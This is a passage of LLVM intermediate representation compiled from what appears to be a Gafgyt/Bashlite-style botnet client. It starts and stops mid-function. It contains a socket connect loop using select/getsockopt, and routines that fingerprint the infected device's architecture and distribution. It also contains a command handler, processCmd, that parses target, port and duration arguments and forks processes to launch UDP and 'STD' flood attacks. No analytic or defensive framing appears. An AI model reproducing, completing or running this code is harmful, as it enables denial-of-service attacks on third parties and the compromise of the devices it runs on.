  %102 = getelementptr inbounds %struct.state_t, %struct.state_t* %101, i32 0, i32 0
  %103 = load i32, i32* %102, align 8
  %104 = call i32 @close(i32 %103)
  br label %110

105:                                              ; preds = %94
  %106 = load i32, i32* %8, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %107
  %109 = getelementptr inbounds %struct.state_t, %struct.state_t* %108, i32 0, i32 1
  store i8 1, i8* %109, align 4
  br label %110

110:                                              ; preds = %105, %98
  br label %262

111:                                              ; preds = %60
  br label %112

112:                                              ; preds = %111
  store %struct.fd_set* %12, %struct.fd_set** %20, align 8
  store i32 0, i32* %19, align 4
  br label %113

113:                                              ; preds = %123, %112
  %114 = load i32, i32* %19, align 4
  %115 = zext i32 %114 to i64
  %116 = icmp ult i64 %115, 16
  br i1 %116, label %117, label %126

117:                                              ; preds = %113
  %118 = load %struct.fd_set*, %struct.fd_set** %20, align 8
  %119 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %118, i32 0, i32 0
  %120 = load i32, i32* %19, align 4
  %121 = zext i32 %120 to i64
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %119, i64 0, i64 %121
  store i64 0, i64* %122, align 8
  br label %123

123:                                              ; preds = %117
  %124 = load i32, i32* %19, align 4
  %125 = add i32 %124, 1
  store i32 %125, i32* %19, align 4
  br label %113, !llvm.loop !30

126:                                              ; preds = %113
  br label %127

127:                                              ; preds = %126
  br label %128

128:                                              ; preds = %127
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %130
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %131, i32 0, i32 0
  %133 = load i32, i32* %132, align 8
  %134 = srem i32 %133, 64
  %135 = zext i32 %134 to i64
  %136 = shl i64 1, %135
  %137 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %139
  %141 = getelementptr inbounds %struct.state_t, %struct.state_t* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = sdiv i32 %142, 64
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [16 x i64], [16 x i64]* %137, i64 0, i64 %144
  %146 = load i64, i64* %145, align 8
  %147 = or i64 %146, %136
  store i64 %147, i64* %145, align 8
  %148 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %148, align 8
  %149 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %149, align 8
  %150 = load i32, i32* %8, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %151
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = add nsw i32 %154, 1
  %156 = call i32 @select(i32 %155, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %156, i32* %16, align 4
  %157 = load i32, i32* %16, align 4
  %158 = icmp eq i32 %157, 1
  br i1 %158, label %159, label %186

159:                                              ; preds = %128
  store i32 4, i32* %14, align 4
  %160 = load i32, i32* %8, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %161
  %163 = getelementptr inbounds %struct.state_t, %struct.state_t* %162, i32 0, i32 0
  %164 = load i32, i32* %163, align 8
  %165 = bitcast i32* %15 to i8*
  %166 = call i32 @getsockopt(i32 %164, i32 1, i32 4, i8* %165, i32* %14) #11
  %167 = load i32, i32* %15, align 4
  %168 = icmp ne i32 %167, 0
  br i1 %168, label %169, label %180

169:                                              ; preds = %159
  %170 = load i32, i32* %8, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %171
  %173 = getelementptr inbounds %struct.state_t, %struct.state_t* %172, i32 0, i32 0
  %174 = load i32, i32* %173, align 8
  %175 = call i32 @close(i32 %174)
  %176 = load i32, i32* %8, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %177
  %179 = getelementptr inbounds %struct.state_t, %struct.state_t* %178, i32 0, i32 1
  store i8 0, i8* %179, align 4
  br label %185

180:                                              ; preds = %159
  %181 = load i32, i32* %8, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %182
  %184 = getelementptr inbounds %struct.state_t, %struct.state_t* %183, i32 0, i32 1
  store i8 2, i8* %184, align 4
  br label %185

185:                                              ; preds = %180, %169
  br label %201

186:                                              ; preds = %128
  %187 = load i32, i32* %16, align 4
  %188 = icmp eq i32 %187, -1
  br i1 %188, label %189, label %200

189:                                              ; preds = %186
  %190 = load i32, i32* %8, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %191
  %193 = getelementptr inbounds %struct.state_t, %struct.state_t* %192, i32 0, i32 0
  %194 = load i32, i32* %193, align 8
  %195 = call i32 @close(i32 %194)
  %196 = load i32, i32* %8, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %197
  %199 = getelementptr inbounds %struct.state_t, %struct.state_t* %198, i32 0, i32 1
  store i8 0, i8* %199, align 4
  br label %200

200:                                              ; preds = %189, %186
  br label %201

201:                                              ; preds = %200, %185
  br label %262

202:                                              ; preds = %60
  br label %203

203:                                              ; preds = %202
  store %struct.fd_set* %12, %struct.fd_set** %22, align 8
  store i32 0, i32* %21, align 4
  br label %204

204:                                              ; preds = %214, %203
  %205 = load i32, i32* %21, align 4
  %206 = zext i32 %205 to i64
  %207 = icmp ult i64 %206, 16
  br i1 %207, label %208, label %217

208:                                              ; preds = %204
  %209 = load %struct.fd_set*, %struct.fd_set** %22, align 8
  %210 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %209, i32 0, i32 0
  %211 = load i32, i32* %21, align 4
  %212 = zext i32 %211 to i64
  %213 = getelementptr inbounds [16 x i64], [16 x i64]* %210, i64 0, i64 %212
  store i64 0, i64* %213, align 8
  br label %214

214:                                              ; preds = %208
  %215 = load i32, i32* %21, align 4
  %216 = add i32 %215, 1
  store i32 %216, i32* %21, align 4
  br label %204, !llvm.loop !31

217:                                              ; preds = %204
  br label %218

218:                                              ; preds = %217
  br label %219

219:                                              ; preds = %218
  %220 = load i32, i32* %8, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %221
  %223 = getelementptr inbounds %struct.state_t, %struct.state_t* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 8
  %225 = srem i32 %224, 64
  %226 = zext i32 %225 to i64
  %227 = shl i64 1, %226
  %228 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %229 = load i32, i32* %8, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %230
  %232 = getelementptr inbounds %struct.state_t, %struct.state_t* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 8
  %234 = sdiv i32 %233, 64
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds [16 x i64], [16 x i64]* %228, i64 0, i64 %235
  %237 = load i64, i64* %236, align 8
  %238 = or i64 %237, %227
  store i64 %238, i64* %236, align 8
  %239 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %239, align 8
  %240 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %240, align 8
  %241 = load i32, i32* %8, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %242
  %244 = getelementptr inbounds %struct.state_t, %struct.state_t* %243, i32 0, i32 0
  %245 = load i32, i32* %244, align 8
  %246 = add nsw i32 %245, 1
  %247 = call i32 @select(i32 %246, %struct.fd_set* null, %struct.fd_set* null, %struct.fd_set* %12, %struct.timeval* %13)
  store i32 %247, i32* %16, align 4
  %248 = load i32, i32* %16, align 4
  %249 = icmp ne i32 %248, 0
  br i1 %249, label %250, label %261

250:                                              ; preds = %219
  %251 = load i32, i32* %8, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %252
  %254 = getelementptr inbounds %struct.state_t, %struct.state_t* %253, i32 0, i32 0
  %255 = load i32, i32* %254, align 8
  %256 = call i32 @close(i32 %255)
  %257 = load i32, i32* %8, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %258
  %260 = getelementptr inbounds %struct.state_t, %struct.state_t* %259, i32 0, i32 1
  store i8 0, i8* %260, align 4
  br label %261

261:                                              ; preds = %250, %219
  br label %262

262:                                              ; preds = %60, %261, %201, %110
  br label %263

263:                                              ; preds = %262
  %264 = load i32, i32* %8, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %8, align 4
  br label %56, !llvm.loop !32

266:                                              ; preds = %56
  br label %51, !llvm.loop !33

267:                                              ; preds = %51
  %268 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %268)
  br label %269

269:                                              ; preds = %267, %34
  ret void
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @getArch() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i64 0, i64 0)
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @getFiles() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.13, i64 0, i64 0), i32 0) #11
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

4:                                                ; preds = %0
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.14, i64 0, i64 0), i8** %1, align 8
  br label %14

5:                                                ; preds = %0
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i64 0, i64 0), i32 0) #11
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %9

8:                                                ; preds = %5
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0), i8** %1, align 8
  br label %14

9:                                                ; preds = %5
  %10 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.17, i64 0, i64 0), i32 0) #11
  %11 = icmp ne i32 %10, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %9
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0), i8** %1, align 8
  br label %14

13:                                               ; preds = %9
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.19, i64 0, i64 0), i8** %1, align 8
  br label %14

14:                                               ; preds = %13, %12, %8, %4
  %15 = load i8*, i8** %1, align 8
  ret i8* %15
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @getDevice() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.20, i64 0, i64 0), i32 0) #11
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

4:                                                ; preds = %0
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.21, i64 0, i64 0), i8** %1, align 8
  br label %6

5:                                                ; preds = %0
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.22, i64 0, i64 0), i8** %1, align 8
  br label %6

6:                                                ; preds = %5, %4
  %7 = load i8*, i8** %1, align 8
  ret i8* %7
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @getPortz() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.13, i64 0, i64 0), i32 0) #11
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

4:                                                ; preds = %0
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.23, i64 0, i64 0), i8** %1, align 8
  br label %18

5:                                                ; preds = %0
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i64 0, i64 0), i32 0) #11
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %9

8:                                                ; preds = %5
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.23, i64 0, i64 0), i8** %1, align 8
  br label %18

9:                                                ; preds = %5
  %10 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.17, i64 0, i64 0), i32 0) #11
  %11 = icmp ne i32 %10, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %9
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.23, i64 0, i64 0), i8** %1, align 8
  br label %18

13:                                               ; preds = %9
  %14 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.24, i64 0, i64 0), i32 0) #11
  %15 = icmp ne i32 %14, -1
  br i1 %15, label %16, label %17

16:                                               ; preds = %13
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.23, i64 0, i64 0), i8** %1, align 8
  br label %18

17:                                               ; preds = %13
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.25, i64 0, i64 0), i8** %1, align 8
  br label %18

18:                                               ; preds = %17, %16, %12, %8, %4
  %19 = load i8*, i8** %1, align 8
  ret i8* %19
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @getDistro() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.26, i64 0, i64 0), i32 0) #11
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

4:                                                ; preds = %0
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.27, i64 0, i64 0), i8** %1, align 8
  br label %18

5:                                                ; preds = %0
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.28, i64 0, i64 0), i32 0) #11
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %9

8:                                                ; preds = %5
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i64 0, i64 0), i8** %1, align 8
  br label %18

9:                                                ; preds = %5
  %10 = call i32 @access(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.30, i64 0, i64 0), i32 0) #11
  %11 = icmp ne i32 %10, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %9
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.31, i64 0, i64 0), i8** %1, align 8
  br label %18

13:                                               ; preds = %9
  %14 = call i32 @access(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.32, i64 0, i64 0), i32 0) #11
  %15 = icmp ne i32 %14, -1
  br i1 %15, label %16, label %17

16:                                               ; preds = %13
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0), i8** %1, align 8
  br label %18

17:                                               ; preds = %13
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.34, i64 0, i64 0), i8** %1, align 8
  br label %18

18:                                               ; preds = %17, %16, %12, %8, %4
  %19 = load i8*, i8** %1, align 8
  ret i8* %19
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @processCmd(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i8*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = alloca i32, align 4
  %47 = alloca i8*, align 8
  %48 = alloca i32, align 4
  %49 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %50 = load i8**, i8*** %4, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 0
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @strcmp(i8* %52, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.35, i64 0, i64 0)) #12
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %172, label %55

55:                                               ; preds = %2
  %56 = load i32, i32* %3, align 4
  %57 = icmp slt i32 %56, 6
  br i1 %57, label %103, label %58

58:                                               ; preds = %55
  %59 = load i8**, i8*** %4, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 3
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @atoi(i8* %61) #12
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %103, label %64

64:                                               ; preds = %58
  %65 = load i8**, i8*** %4, align 8
  %66 = getelementptr inbounds i8*, i8** %65, i64 2
  %67 = load i8*, i8** %66, align 8
  %68 = call i32 @atoi(i8* %67) #12
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %103, label %70

70:                                               ; preds = %64
  %71 = load i8**, i8*** %4, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 4
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 @atoi(i8* %73) #12
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %103, label %76

76:                                               ; preds = %70
  %77 = load i8**, i8*** %4, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 5
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @atoi(i8* %79) #12
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %103, label %82

82:                                               ; preds = %76
  %83 = load i8**, i8*** %4, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 5
  %85 = load i8*, i8** %84, align 8
  %86 = call i32 @atoi(i8* %85) #12
  %87 = icmp sgt i32 %86, 65500
  br i1 %87, label %103, label %88

88:                                               ; preds = %82
  %89 = load i8**, i8*** %4, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 4
  %91 = load i8*, i8** %90, align 8
  %92 = call i32 @atoi(i8* %91) #12
  %93 = icmp sgt i32 %92, 32
  br i1 %93, label %103, label %94

94:                                               ; preds = %88
  %95 = load i32, i32* %3, align 4
  %96 = icmp eq i32 %95, 7
  br i1 %96, label %97, label %104

97:                                               ; preds = %94
  %98 = load i8**, i8*** %4, align 8
  %99 = getelementptr inbounds i8*, i8** %98, i64 6
  %100 = load i8*, i8** %99, align 8
  %101 = call i32 @atoi(i8* %100) #12
  %102 = icmp slt i32 %101, 1
  br i1 %102, label %103, label %104

103:                                              ; preds = %97, %88, %82, %76, %70, %64, %58, %55
  br label %813

104:                                              ; preds = %97, %94
  %105 = load i8**, i8*** %4, align 8
  %106 = getelementptr inbounds i8*, i8** %105, i64 1
  %107 = load i8*, i8** %106, align 8
  store i8* %107, i8** %5, align 8
  %108 = load i8**, i8*** %4, align 8
  %109 = getelementptr inbounds i8*, i8** %108, i64 2
  %110 = load i8*, i8** %109, align 8
  %111 = call i32 @atoi(i8* %110) #12
  store i32 %111, i32* %6, align 4
  %112 = load i8**, i8*** %4, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 3
  %114 = load i8*, i8** %113, align 8
  %115 = call i32 @atoi(i8* %114) #12
  store i32 %115, i32* %7, align 4
  %116 = load i8**, i8*** %4, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 4
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 @atoi(i8* %118) #12
  store i32 %119, i32* %8, align 4
  %120 = load i8**, i8*** %4, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 5
  %122 = load i8*, i8** %121, align 8
  %123 = call i32 @atoi(i8* %122) #12
  store i32 %123, i32* %9, align 4
  %124 = load i32, i32* %3, align 4
  %125 = icmp eq i32 %124, 7
  br i1 %125, label %126, label %131

126:                                              ; preds = %104
  %127 = load i8**, i8*** %4, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 6
  %129 = load i8*, i8** %128, align 8
  %130 = call i32 @atoi(i8* %129) #12
  br label %132

131:                                              ; preds = %104
  br label %132

132:                                              ; preds = %131, %126
  %133 = phi i32 [ %130, %126 ], [ 10, %131 ]
  store i32 %133, i32* %10, align 4
  %134 = load i8*, i8** %5, align 8
  %135 = call i8* @strstr(i8* %134, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #12
  %136 = icmp ne i8* %135, null
  br i1 %136, label %137, label %158

137:                                              ; preds = %132
  %138 = load i8*, i8** %11, align 8
  %139 = call i8* @strtok(i8* %138, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %139, i8** %11, align 8
  br label %140

140:                                              ; preds = %155, %137
  %141 = load i8*, i8** %11, align 8
  %142 = icmp ne i8* %141, null
  br i1 %142, label %143, label %157

143:                                              ; preds = %140
  %144 = call i32 @listFork()
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %155, label %146

146:                                              ; preds = %143
  %147 = load i8*, i8** %11, align 8
  %148 = load i32, i32* %6, align 4
  %149 = load i32, i32* %7, align 4
  %150 = load i32, i32* %8, align 4
  %151 = load i32, i32* %9, align 4
  %152 = load i32, i32* %10, align 4
  call void @audp(i8* %147, i32 %148, i32 %149, i32 %150, i32 %151, i32 %152)
  %153 = load i32, i32* @mainCommSock, align 4
  %154 = call i32 @close(i32 %153)
  call void @_exit(i32 0) #13
  unreachable

155:                                              ; preds = %143
  %156 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %156, i8** %11, align 8
  br label %140, !llvm.loop !34

157:                                              ; preds = %140
  br label %171

158:                                              ; preds = %132
  %159 = call i32 @listFork()
  %160 = icmp ne i32 %159, 0
  br i1 %160, label %161, label %162

161:                                              ; preds = %158
  br label %813

162:                                              ; preds = %158
  %163 = load i8*, i8** %5, align 8
  %164 = load i32, i32* %6, align 4
  %165 = load i32, i32* %7, align 4
  %166 = load i32, i32* %8, align 4
  %167 = load i32, i32* %9, align 4
  %168 = load i32, i32* %10, align 4
  call void @audp(i8* %163, i32 %164, i32 %165, i32 %166, i32 %167, i32 %168)
  %169 = load i32, i32* @mainCommSock, align 4
  %170 = call i32 @close(i32 %169)
  call void @_exit(i32 0) #13
  unreachable

171:                                              ; preds = %157
  br label %172

172:                                              ; preds = %171, %2
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 0
  %175 = load i8*, i8** %174, align 8
  %176 = call i32 @strcmp(i8* %175, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.36, i64 0, i64 0)) #12
  %177 = icmp ne i32 %176, 0
  br i1 %177, label %234, label %178

178:                                              ; preds = %172
  %179 = load i32, i32* %3, align 4
  %180 = icmp slt i32 %179, 4
  br i1 %180, label %193, label %181

181:                                              ; preds = %178
  %182 = load i8**, i8*** %4, align 8
  %183 = getelementptr inbounds i8*, i8** %182, i64 2
  %184 = load i8*, i8** %183, align 8
  %185 = call i32 @atoi(i8* %184) #12
  %186 = icmp slt i32 %185, 1
  br i1 %186, label %193, label %187

187:                                              ; preds = %181
  %188 = load i8**, i8*** %4, align 8
  %189 = getelementptr inbounds i8*, i8** %188, i64 3
  %190 = load i8*, i8** %189, align 8
  %191 = call i32 @atoi(i8* %190) #12
  %192 = icmp slt i32 %191, 1
  br i1 %192, label %193, label %194

193:                                              ; preds = %187, %181, %178
  br label %813

194:                                              ; preds = %187
  %195 = load i8**, i8*** %4, align 8
  %196 = getelementptr inbounds i8*, i8** %195, i64 1
  %197 = load i8*, i8** %196, align 8
  store i8* %197, i8** %12, align 8
  %198 = load i8**, i8*** %4, align 8
  %199 = getelementptr inbounds i8*, i8** %198, i64 2
  %200 = load i8*, i8** %199, align 8
  %201 = call i32 @atoi(i8* %200) #12
  store i32 %201, i32* %13, align 4
  %202 = load i8**, i8*** %4, align 8
  %203 = getelementptr inbounds i8*, i8** %202, i64 3
  %204 = load i8*, i8** %203, align 8
  %205 = call i32 @atoi(i8* %204) #12
  store i32 %205, i32* %14, align 4
  %206 = load i8*, i8** %12, align 8
  %207 = call i8* @strstr(i8* %206, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #12
  %208 = icmp ne i8* %207, null
  br i1 %208, label %209, label %225

209:                                              ; preds = %194
  %210 = load i8*, i8** %15, align 8
  %211 = call i8* @strtok(i8* %210, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %211, i8** %15, align 8
  br label %212

212:                                              ; preds = %222, %209
  %213 = load i8*, i8** %15, align 8
  %214 = icmp ne i8* %213, null
  br i1 %214, label %215, label %224

215:                                              ; preds = %212
  %216 = call i32 @listFork()
  %217 = icmp ne i32 %216, 0
  br i1 %217, label %222, label %218

218:                                              ; preds = %215
  %219 = load i8*, i8** %15, align 8
  %220 = load i32, i32* %13, align 4
  %221 = load i32, i32* %14, align 4
  call void @astd(i8* %219, i32 %220, i32 %221)
  call void @_exit(i32 0) #13
  unreachable

222:                                              ; preds = %215
  %223 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #11
  store i8* %223, i8** %15, align 8
  br label %212, !llvm.loop !35

224:                                              ; preds = %212
  br label %233

225:                                              ; preds = %194
  %226 = call i32 @listFork()
  %227 = icmp ne i32 %226, 0
  br i1 %227, label %228, label %229

228:                                              ; preds = %225
  br label %813

229:                                              ; preds = %225
  %230 = load i8*, i8** %12, align 8
  %231 = load i32, i32* %13, align 4
  %232 = load i32, i32* %14, align 4
  call void @astd(i8* %230, i32 %231, i32 %232)
  call void @_exit(i32 0) #13
  unreachable

233:                                              ; preds = %224
  br label %234

234:                                              ; preds = %233, %172
  %235 = load i8**, i8*** %4, align 8
  %236 = getelementptr inbounds i8*, i8** %235, i64 0
  %237 = load i8*, i8** %236, align 8
  %238 = call i32 @strcmp(i8* %237, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.37, i64 0, i64 0)) #12
  %239 = icmp ne i32 %238, 0
  br i1 %239, label %365, label %240

240:                                              ; preds = %234
  %241 = load i32, i32* %3, align 4
  %242 = icmp slt i32 %241, 6
  br i1 %242, label %285, label %243

243:                                              ; preds = %240
  %244 = load i8**, i8*** %4, align 8
  %245 = getelementptr inbounds i8*, i8** %244, i64 3
  %246 = load i8*, i8** %245, align 8
  %247 = call i32 @atoi(i8* %246) #12
  %248 = icmp eq i32 %247, -1
  br i1 %248, label %285, label %249

249:                                              ; preds = %243
  %250 = load i8**, i8*** %4, align 8
  %251 = getelementptr inbounds i8*, i8** %250, i64 2
  %252 = load i8*, i8** %251, align 8
  %253 = call i32 @atoi(i8* %252) #12
  %254 = icmp eq i32 %253, -1
  br i1 %254, label %285, label %255

255:                                              ; preds = %249
  %256 = load i8**, i8*** %4, align 8
  %257 = getelementptr inbounds i8*, i8** %256, i64 4
  %258 = load i8*, i8** %257, align 8
  %259 = call i32 @atoi(i8* %258) #12
  %260 = icmp eq i32 %259, -1
  br i1 %260, label %285, label %261

261:                                              ; preds = %255
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 4
  %264 = load i8*, i8** %263, align 8
  %265 = call i32 @atoi(i8* %264) #12
  %266 = icmp sgt i32 %265, 32
  br i1 %266, label %285, label %267

267:                                              ; preds = %261
  %268 = load i32, i32* %3, align 4
  %269 = icmp sgt i32 %268, 6
  br i1 %269, label %270, label %276

270:                                              ; preds = %267
  %271 = load i8**, i8*** %4, align 8
  %272 = getelementptr inbounds i8*, i8** %271, i64 6
  %273 = load i8*, i8** %272, align 8
  %274 = call i32 @atoi(i8* %273) #12
  %275 = icmp slt i32 %274, 0
  br i1 %275, label %285, label %276

276:                                              ; preds = %270, %267
  %277 = load i32, i32* %3, align 4
  %278 = icmp eq i32 %277, 8
  br i1 %278, label %279, label %286

279:                                              ; preds = %276
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 7
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @atoi(i8* %282) #12
  %284 = icmp slt i32 %283, 1
  br i1 %284, label %285, label %286

285:                                              ; preds = %279, %270, %261, %255, %249, %243, %240
  br label %813

